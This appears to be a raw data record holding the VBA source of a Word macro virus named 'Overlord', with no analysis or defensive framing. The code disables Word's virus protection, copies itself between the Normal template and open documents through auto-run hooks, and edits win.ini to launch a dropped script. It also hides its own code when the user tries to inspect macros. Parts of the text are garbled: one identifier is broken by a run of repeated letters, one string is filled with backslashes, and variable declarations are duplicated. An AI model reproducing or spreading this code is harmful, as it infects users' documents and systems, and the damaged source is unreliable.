[{'code': 'Attribute VB_Name = "ThisDocument"\r\nAttribute VB_Base = "1Normal.ThisDocument"\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n'}
 {'code': 'Attribute VB_Name = "Module"\r\nSub AutoClose()\r\n\r\n\'MyName = Overlord\r\n\'WrittenBy = f0re [UC/Skamwerks/DVC]\r\n\'Version = .B (1.1)\r\n\r\nOn Error Resume Next\r\n\r\nwindir = Environ("windir")\r\nIf Dir(windir & "\\tempad.dll") <> "" Then Kill (windir & "\\tempad.dll")\r\nIf Dir(windir & "\\tempnt.dll") <> "" Then Kill (windir & "\\tempnt.dll")\r\n\r\nOptions.VirusProtection = False\r\nOptions.ConfirmConversions = False\r\nOptions.SaveNormalPrompt = False\r\n\r\nIf NormalTemplahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhte.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "\'MyName = Overlord" Then\r\nActiveDocument.VBProject.VBComponents("Module").Export (windir & "\\tempad.dll")\r\nNormalTemplate.VBProject.VBComponents.import (windir & "\\tempad.dll")\r\nNormalTemplate.Save\r\nEnd If\r\nIf ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "\'MyName                                                                                                                                     \\\\\\\\\\\\\\\\\\\\            \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ = Overlord" Then\r\nNormalTemplate.VBProject.VBComponents("Module").Export (windir & "\\tempnt.dll")\r\nActiveDocument.VBProject.VBComponents.import (windir & "\\tempnt.dll")\r\nActiveDocument.SaveAs ActiveDocument.FullName\r\nEnd If\r\n\r\nIf Dir("c:\\Himem.sys") <> "" Then\r\nOpen "c:\\Himem.sys" For Input As #1\r\nOpen "c:\\Himem.sy_" For Output As #2\r\nDo While Not EOF(1)\r\n Input #1, Line\r\n If Line <> ActiveDocument.FullName Then Print #2, Line\r\nLoop\r\nClose #1\r\nClose #2\r\n\r\nKill ("c:\\Himem.sys")\r\nFileCopy "c:\\Himem.sy_", "c:\\Himem.sys"\r\nKill ("c:\\Himem.sy_")\r\nEnd If\r\n\r\nEnd Sub\r\nSub AutoOpen()\r\n\r\nOn Error Resume Next\r\nwindir = Environ("windir")\r\n\r\nOpen "c:\\Himem.sys" For Append As #1\r\nPrint #1, ActiveDocument.FullName\r\nClose #1\r\n\r\nEnd Sub\r\n\r\nSub Stealth()\r\nOn Error Resume Next\r\n\r\nwindir = Environ("windir")\r\n\r\nSystem.PrivateProfileString("", "HKEY_LOCAL_MACHINE\\software\\", "RegisteredOwner") = "the Overlord"\r\n\r\nOpen windir & "\\win.ini" For Input As #1\r\nOpen "c:\\win._ni" For Output As #2\r\nDo While Not EOF(1)\r\n Line Input #1, Line\r\n If Line = "[windows]" Then\r\n  Print #2, Line\r\n  Print #2, "run = " & windir & "\\overlord.b.vbs"\r\n Else\r\n  Print #2, Line\r\n End If\r\nLoop\r\nClose #1\r\nClose #2\r\n\r\nFileCopy "c:\\win._ni", windir & "\\win.ini"\r\nKill ("c:\\win._ni")\r\n\r\nIf Dir(windir & "\\overlord.b.vbs") <> "" Then Kill (windir & "\\overlord.b.vbs")\r\n\r\nOpen "c:\\windows\\overlord.b.vbs" For Append As #1\r\nPrint #1, "On error resume next"\r\nPrint #1, ""\r\nPrint #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"\r\nPrint #1, "WordObj.Options.SaveNormalPrompt = False"\r\nPrint #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"\r\nPrint #1, "WordObj.NormalTemplate.save"\r\nPrint #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\\overlord.b.dll" & Chr(34) & ")"\r\nPrint #1, "WordObj.NormalTemplate.save"\r\nPrint #1, ""\r\nPrint #1, "Dim FSO"\r\nPrint #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"\r\n'coment1\nPrint #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\\himem.sys" & Chr(34) & ", 1, True)" 'coment 2\r\nPrint #1, "contents = a.readall()"\r\nPrint #1, "a.close"\r\nPrint #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\\himem.dll" & Chr(34) & ", 2, True)"\r\nPrint #1, "b.write(contents)"\r\nPrint #1, "b.close"\r\nPrint #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\\himem.dll" & Chr(34) & ", 1, True)"\r\nPrint #1, "Do While a.atendofstream <> True"\r\nPrint #1, "documentname = a.readline"\r\nPrint #1, "If documentname <> " & Chr(34) & Chr(34) & " then"\r\nPrint #1, "WordObj.Documents.open (documentname)"\r\nPrint #1, "WordObj.activedocument.save"\r\nPrint #1, "WordObj.activedocument.close"\r\nPrint #1, "End if"\r\nPrint #1, "Loop"\r\nPrint #1, "a.close"\r\nPrint #1, "set NT = " & Chr(34) & Chr(34)\r\nPrint #1, "WordObj.Quit"\r\nPrint #1, "fso.deletefile" & Chr(34) & "c:\\himem.sys" & Chr(34)\r\nPrint #1, "fso.deletefile" & Chr(34) & "c:\\himem.dll" & Chr(34)\r\nClose #1\r\n\r\nNormalTemplate.VBProject.VBComponents("Module").Export (windir & "\\overlord.b.dll")\r\n\r\nEnd Sub\r\nSub ViewVBCode()\r\nOn Error Resume Next\r\n\r\nCall Stealth\r\n\r\nNormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines\r\nNormalTemplate.Saved = True\r\nNormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")\r\nNormalTemplate.Saved = True\r\n\r\nDocnumber = Application.Documents.Count\r\nIf Docnumber >= 1 Then\r\nFor x = 1 To Docnumber\r\nDocuments(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines\r\nDocuments(x).Saved = True\r\nDocuments(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")\r\nDocuments(x).Saved = True\r\nNext x\r\nEnd If\r\n\r\nApplication.ShowVisualBasicEditor = True\r\n\r\nEnd Sub\r\nSub ToolsMacro()\r\nOn Error Resume Next\r\n\r\nFor x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines\r\n codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)\r\nNext x\r\nNormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines\r\nNormalTemplate.Saved = True\r\n\r\nDocnumber = Application.Documents.Count\r\nIf Docnumber >= 1 Then\r\n For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.countoflines\r\n  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)\r\n Next y\r\n For x = 1 To Docnumber\r\n Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines\r\n Documents(x).Saved = True\r\n Next x\r\nEnd If\r\n\r\nApplication.Dialogs(wdDialogToolsMacro).Show\r\n\r\nIf Application.ShowVisualBasicEditor = False Then\r\n NormalTemplate.VBProject.VBComponents("Module").CodeModule.insertlines 1, codeNT\r\n NormalTemplate.Save\r\n \r\nIf Docnumber >= 1 Then\r\nFor x = 1 To Docnumber\r\nDocuments(x).VBProject.VBComponents("Module").CodeModule.insertlines 1, CodeAD\r\nDocuments(x).SaveAs Documents(x).FullName\r\nNext x\r\nEnd If\r\nEnd If\r\nEnd Sub\r\nDim Reda As Integer\r\nDim Reda As String\nDim Reda As Integer\n Dim redax As Integer\n\'Put this code in a module called "Module". This is another version of overlord.\r\n\'It uses a different stealth mechanism. Again however not perfect stealth,\r\n 'but perhaps also a nice attempt i hope :).\r\n\r\n\r\n\r\n\r\n'}]